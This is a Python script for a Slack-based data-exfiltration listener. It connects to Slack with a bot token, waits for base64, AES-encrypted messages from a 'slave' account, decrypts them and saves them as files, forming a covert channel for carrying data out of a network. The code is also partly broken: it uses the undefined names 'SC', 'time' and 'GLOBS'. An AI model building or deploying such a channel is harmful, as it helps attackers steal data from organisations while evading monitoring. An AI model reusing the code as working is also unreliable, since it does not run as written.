#!/usr/bin/python

import os
import sys
import random
import base64
import hashlib

from Crypto import Random
from Crypto.Cipher import AES
from slackclient import SlackClient

# CONSTANTS
POST_MESSAGE = "chat.postMessage"


def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


class AESCipher(object):
    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        # enc = base64.b64decode(enc)
        iv = enc[: AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size :])).decode("utf-8")

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[: -ord(s[len(s) - 1 :])]


class SlackExfiltrator:
    def __init__(self, slackSlaveID, slackToken, encKey):
        self.slackSlaveID = slackSlaveID
        self.slackToken = slackToken
        self.encKey = encKey

        self.encDriver = AESCipher(key=self.encKey)
        self.slackObj = None

    def _connect2Slack(self):
        self.slackObj = SlackClient(self.slackToken)

        if self.slackObj.api_call("api.test")["ok"] == True:
            sys.stdout.write("[+]\tConnected to Slack. API is valid!\n")
            return True

        else:
            sys.stderr.write("Unable to connect to slack. Maybe token is wrong?\n")
            sys.stderr.write("%s\n" % self.slackObj.api_call("api.test")["error"])
            sys.exit(1)

    def Listen(self):
        SC.api_call(
            "chat.postMessage",
            as_user=True,
            channel=self.slackSlaveID,
            text="Bot is now online and will accept your calls.",
        )
        if SC.rtm_connect():
            while True:
                answer = SC.rtm_read()
                try:
                    answer = answer[0]
                except IndexError:
                    continue

                try:
                    user = answer["user"]
                    mtype = answer["type"]
                except KeyError:
                    continue

                if answer["type"] == "message" and answer["user"] == self.slackSlaveID:
                    sys.stdout.write("[.]\tGot a message from SlackSlaveID!\n")
                    try:
                        data = base64.b64decode(answer["text"])
                    except:
                        sys.stderr.write("[-]\tMessage from SlaveID is not Base64!\n")
                        continue

                    try:
                        decData = self.encDriver.decrypt(data)
                    except:
                        sys.stderr.write("[!]\tYou are not using the same key.\n")
                        continue

                    fname = str(random.randint(1111, 9999)) + ".raw"
                    f = open(fname, "wb")
                    f.write(decData)
                    f.close()
                    sys.stdout.write("[+]\tFile '%s' has been saved.\n" % fname)

                time.sleep(GLOBS.TIMEOUT)


if __name__ == "__main__":
    slackExf = SlackExfiltrator(
        slackSlaveID="11111FD", slackToken="xoxo-abc", encKey="Abc!23"
    )
    slackExf._connect2Slack()
    slackExf.Listen()
